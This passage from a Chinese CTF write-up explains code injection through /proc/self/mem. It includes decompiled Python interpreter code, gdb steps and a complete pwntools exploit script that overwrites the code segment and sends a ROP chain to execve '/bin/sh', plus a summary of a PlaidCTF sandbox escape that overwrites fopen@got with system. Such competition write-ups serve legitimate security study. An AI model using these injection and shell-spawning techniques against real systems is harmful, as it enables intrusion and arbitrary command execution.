    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      int v3; // ebp
      __int64 v4; // r13
      __int64 v5; // rax
      __int64 v6; // r12
      char *v7; // rax
      const char *v8; // r15
      __int64 v9; // rbx
      __int64 v10; // rax
      __int64 v11; // rax
      const char *v12; // rdi
      __int64 v13; // r15
      int v14; // er14
      __int64 v15; // rdi
      v3 = argc;
      PyMem_SetupAllocators("malloc");
      v4 = PyMem_RawMalloc(8LL * (argc + 1));
      v5 = PyMem_RawMalloc(8LL * (argc + 1));
      if ( v4 && (v6 = v5) != 0 && (v7 = setlocale(6, 0LL), (v8 = (const char *)PyMem_RawStrdup(v7)) != 0LL) )
      {
        v9 = 0LL;
        setlocale(6, &locale);
        while ( argc > (signed int)v9 )
        {
          v10 = Py_DecodeLocale((__int64)argv[v9], 0LL);
          *(_QWORD *)(v4 + 8 * v9) = v10;
          if ( !v10 )
          {
            v14 = 1;
            PyMem_RawFree(v8);
            __fprintf_chk(stderr, 1LL, "Fatal Python error: unable to decode the command line argument #%i\n");
            return v14;
          }
          *(_QWORD *)(v6 + 8 * v9++) = v10;
        }
        v11 = argc;
        *(_QWORD *)(v4 + 8 * v11) = 0LL;
        *(_QWORD *)(v6 + 8 * v11) = 0LL;
        setlocale(6, v8);
        v12 = v8;
        v13 = 0LL;
        PyMem_RawFree(v12);
        v14 = Py_Main(v3, v4);
        PyMem_SetupAllocators("malloc");
        while ( v3 > (signed int)v13 )
        {
          v15 = *(_QWORD *)(v6 + 8 * v13++);
          PyMem_RawFree(v15);
        }
        PyMem_RawFree(v4);
        PyMem_RawFree(v6);
      }
      else
      {
        v14 = 1;
        __fprintf_chk(stderr, 1LL, "out of memory\n");
      }
      return v14;
    }
    /*
    loc_4B0F71:
    add     rsp, 18h
    mov     eax, r14d
    pop     rbx
    pop     rbp
    pop     r12
    pop     r13
    pop     r14
    pop     r15
    retn
    */
在gdb调试看一下(r之后ctrl+d进入结束部分)
    gdb ./py3_remote
    set arch i386:x86-64:intel
    b* 0x4b0f71
    r
单步执行发现到`0x4b0f80`栈顶为`0`，我们的目的是调用`read(0,rsp,sz)`，`rdi`可以在此处pop
0进去，另外`r12`是一个不错的较大的整数可以赋值给`rdx`，因此可以在这里进行代码注入，注入的第一段汇编如下，读取第二段`rop
chain`之后`ret`触发执行我们的代码即可get shell。
    pop rdi
    mov rsi, rsp
    mov rdx, r12
    syscall
    ret
第一次代码注入后调用情况如下
### exp.py
    #coding=utf-8
    from pwn import *
    context.update(arch='amd64',os='linux',log_level="DEBUG")
    context.terminal = ['tmux','split','-h']
    p = process("./abw")
    elf = ELF('./python3.6')
    p_rdi = 0x0000000000421872
    p_rsi = 0x000000000042159a
    p_rdx = 0x00000000004026c1
    p_rax = 0x0000000000421095
    syscall = 0x4b0f87
    def exp():
        gdb.attach(p,'b* 0x4b0f78')
        data = asm('''
            pop rdi
            mov rsi, rsp
            mov rdx, r12
            syscall
            ret
            ''').encode('hex')
        offset = 0x4b0f80
        p.sendlineafter(" :", "/proc/self/mem")
        p.sendlineafter(" :", str(offset))
        p.sendlineafter(":", data)
        raw_input()
        #read more
        bss_base = elf.bss()
        gadets = [
                p_rdi,0,
                p_rsi,bss_base,
                p_rdx,0x8,
                p_rax,0,
                syscall,
                p_rdi,bss_base,
                p_rsi,0,
                p_rdx,0,
                p_rax,59,
                syscall
                ]
        gadets = flat(gadets)
        p.send(gadets)
        raw_input()
        p.send("/bin/sh\x00")
        p.interactive()
    exp()
## PlaidCTF 2014 ' **nightmares** '
这道题目是一道`python沙箱逃逸题目`，我们在能够控制`stdout`的情况下可以实现任意文件读写，这里博主的做法是通过`/proc/self/mem`覆盖`fopen@got`为`system`，这样在`open('file_name')`的时候可以通过修改文件名执行任意命令，具体可以参考下文。
["PlaidCTF 2014 ' **nightmares** ' (Pwnables 375)
writeup"](https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/)
## 总结
`/proc/self/maps`和`/proc/self/mem`作为两个系统映射的虚拟文件存储了进程相关的重要信息，读取前者可以获取进程的所有段的基地址，修改后者相当于可修改只读的代码段内容实现`进程注入`，相关的题目除了本文提到的两道题外还有2018年全国大学生信息安全竞赛的`task_house`，有兴趣的大佬可以做一下。
## 参考
[无需Ptrace就能实现Linux进程间代码注入](https://zhuanlan.zhihu.com/p/29264608)
["PlaidCTF 2014 ' **nightmares** ' (Pwnables 375)
writeup"](https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/)
[DaJun-需要读取maps和mem文件的pwn](https://dayjun.top/2019/12/19/%E9%9C%80%E8%A6%81%E8%AF%BB%E5%8F%96maps%E5%92%8Cmem%E6%96%87%E4%BB%B6%E7%9A%84pwn/)